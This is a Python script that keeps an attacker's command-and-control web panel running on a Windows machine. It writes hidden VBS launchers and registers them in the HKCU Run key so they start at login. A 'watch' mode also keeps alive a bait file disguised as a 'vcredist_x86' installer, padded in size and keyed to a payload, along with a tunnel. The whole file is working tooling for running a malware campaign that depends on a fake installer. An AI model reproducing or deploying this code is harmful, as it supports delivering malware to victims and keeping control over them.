#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Panel autostart -- keep the web C2 coming back after a reboot.

    python autostart.py install --port 8080 --token SuaChave
    python autostart.py status
    python autostart.py start
    python autostart.py remove

Writes a hidden VBS launcher (pythonw, no console) and registers it in
HKCU\\...\\Run, so the panel is already listening when you log back in.
"""

import argparse
import os
import socket
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
VALUE = "RAFPanel"
VALUE_WATCH = "RAFSite"
VBS_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "RAF")
VBS = os.path.join(VBS_DIR, "panel.vbs")
VBS_WATCH = os.path.join(VBS_DIR, "site.vbs")


def _pythonw():
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        cand = exe[:-10] + "pythonw.exe"
        if os.path.exists(cand):
            return cand
    return exe


def _args(c2port, port, token, key):
    a = "web.py --c2-port %d --port %d" % (c2port, port)
    if key:
        a += " --key %s" % key
    if token:
        a += " --token %s" % token
    return a


def _write_vbs(path, runline):
    body = ('Set sh = CreateObject("WScript.Shell")\r\n'
            'sh.CurrentDirectory = "%s"\r\n'
            'sh.Run "%s", 0, False\r\n' % (HERE, runline.replace('"', '""')))
    with open(path, "w", encoding="utf-8", newline="") as f:
        f.write(body)
    return path


def _set_run(name, path):
    import winreg
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, 'wscript.exe "%s"' % path)


def _del_run(name):
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, name)
        return True
    except OSError:
        return False


def install_watch(key, token, theme, name, exe_name, pad):
    """Instala o vigia: no login ele sobe painel + isca + tunel e mantem tudo."""
    os.makedirs(VBS_DIR, exist_ok=True)
    args = "golive.py --watch --log golive.log --key %s --token %s --theme %s --exe-name %s" % (
        key, token, theme, exe_name)
    if name:
        args += " --name %s" % name
    if pad:
        args += " --pad %d" % pad
    _write_vbs(VBS_WATCH, '"%s" %s' % (_pythonw(), args))
    _set_run(VALUE_WATCH, VBS_WATCH)
    return VBS_WATCH


def remove_watch():
    _del_run(VALUE_WATCH)
    try:
        if os.path.isfile(VBS_WATCH):
            os.remove(VBS_WATCH)
    except OSError:
        pass


def install(c2port, port, token, key):
    import winreg
    os.makedirs(VBS_DIR, exist_ok=True)
    runline = '"%s" %s' % (_pythonw(), _args(c2port, port, token, key))
    body = ('Set sh = CreateObject("WScript.Shell")\r\n'
            'sh.CurrentDirectory = "%s"\r\n'
            'sh.Run "%s", 0, False\r\n' % (HERE, runline.replace('"', '""')))
    with open(VBS, "w", encoding="utf-8", newline="") as f:
        f.write(body)

    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, VALUE, 0, winreg.REG_SZ, 'wscript.exe "%s"' % VBS)
    return VBS


def remove():
    import winreg
    gone = False
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, VALUE)
        gone = True
    except OSError:
        pass
    try:
        if os.path.isfile(VBS):
            os.remove(VBS)
    except OSError:
        pass
    return gone


def start_now():
    if not os.path.isfile(VBS):
        raise SystemExit("[!] not installed -- run: python autostart.py install")
    subprocess.Popen(["wscript.exe", VBS], close_fds=True,
                     stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL)


def listening(port):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=1)
        s.close()
        return True
    except OSError:
        return False


def status(port):
    import winreg
    out = {}
    for name in (VALUE, VALUE_WATCH):
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as k:
                out[name] = winreg.QueryValueEx(k, name)[0]
        except OSError:
            out[name] = None
    out["launcher"] = VBS if os.path.isfile(VBS) else None
    out["vigia"] = VBS_WATCH if os.path.isfile(VBS_WATCH) else None
    out["listening_%d" % port] = listening(port)
    return out


def main():
    ap = argparse.ArgumentParser(description="RAF panel autostart")
    ap.add_argument("action", choices=["install", "remove", "status", "start",
                                       "install-watch", "remove-watch"])
    ap.add_argument("--c2-port", type=int, default=4444)
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--token", default="raf2026")
    ap.add_argument("--theme", default="vcredist")
    ap.add_argument("--name", default=None, help="nome do arquivo entregue")
    ap.add_argument("--exe-name", default="vcredist_x86")
    ap.add_argument("--pad", type=int, default=270141)
    ap.add_argument("--key", default="raf-7c1f4b2e9a3d5f8b6c0e2a4d",
                    help="chave compartilhada (precisa ser a mesma do payload)")
    a = ap.parse_args()

    if a.action == "install-watch":
        path = install_watch(a.key, a.token, a.theme, a.name, a.exe_name, a.pad)
        remove()                        # o vigia ja sobe o painel: nao duplica
        print("vigia    : %s" % path)
        print("run key  : HKCU\\%s\\%s" % (RUN_KEY, VALUE_WATCH))
        print("sobe no login e mantem painel + isca + tunel de pe")
        print("agora    : python golive.py --watch")
    elif a.action == "remove-watch":
        remove_watch()
        print("vigia removido")
    elif a.action == "install":
        path = install(a.c2_port, a.port, a.token, a.key)
        print("launcher : %s" % path)
        print("run key  : HKCU\\%s\\%s" % (RUN_KEY, VALUE))
        print("url      : http://127.0.0.1:%d/?t=%s" % (a.port, a.token))
        print("starts on next login, hidden (pythonw via wscript)")
    elif a.action == "remove":
        print("removed" if remove() else "was not installed")
    elif a.action == "start":
        start_now()
        print("started; waiting for the port...")
        for _ in range(20):
            if listening(a.port):
                print("panel up: http://127.0.0.1:%d/?t=%s" % (a.port, a.token))
                return 0
            import time
            time.sleep(0.25)
        print("[!] port %d not listening yet" % a.port)
        return 1
    else:
        for k, v in status(a.port).items():
            print("%-16s %s" % (k, v))
    return 0


if __name__ == "__main__":
    sys.exit(main())
